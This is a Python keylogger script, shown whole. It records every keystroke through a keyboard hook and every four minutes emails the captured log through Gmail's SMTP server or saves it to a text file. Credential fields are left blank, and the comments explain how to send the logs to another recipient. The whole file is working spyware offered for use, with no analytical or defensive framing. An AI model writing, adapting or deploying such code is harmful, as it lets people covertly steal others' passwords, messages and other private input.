import keyboard, smtplib
from threading import Timer
from datetime import datetime as dt

REPORT_DELAY = 240 #60 (seconds) = 1 minute
EMAIL_ADD = "@gmail.com"
EMAIL_PASS = "" #we will need both address and password to log into a gmail account to send logs
active_method = "email"  #available methods are: email, file

class Logger:
    def __init__(self, interval, method="email"):
        self.interval = interval
        self.method = method
        self.log=""
        self.start_dt = dt.now()
        self.end_dt = dt.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1: #so this is not a character
            
            if name == "space":
                name = " "
            
            elif name == "enter":
                name = "[ENTER]\n"

            elif name == "digital":
                name = "."
            
            else:
                name = name.replace(" ", "_") 
                #replace spaces with underscores 
                #ex. "this is example" becomes "this_is_example"
                name = f"[{name.upper()}]"
        
        self.log += name
    
    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"log-{start_dt_str}_{end_dt_str}"
    
    def create_report_file(self):
        with open(f"{self.filename}.txt", "w") as logf:
            print(self.log, file=logf)
        print(f"[+] Saved {self.filename}.txt")
    
    def send_log(self, email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message) 
        #by having 2 times the email parameter the log will be sent to the address who actually sends it
        #if you want another addressee you will need to change the second email parameter 
        #ex. server.sendmail(email, "your_random_mail@gmail.com", message)
        server.quit()
    
    def report(self):
        if self.log:
            self.end_dt = dt.now()
            self.update_filename()
            if self.method == "email":
                self.send_log(EMAIL_ADD, EMAIL_PASS, self.log)
            elif self.method == "file":
                self.create_report_file()
            self.start_dt = dt.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = dt.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    logger = Logger(interval=REPORT_DELAY, method=active_method)
    logger.start()
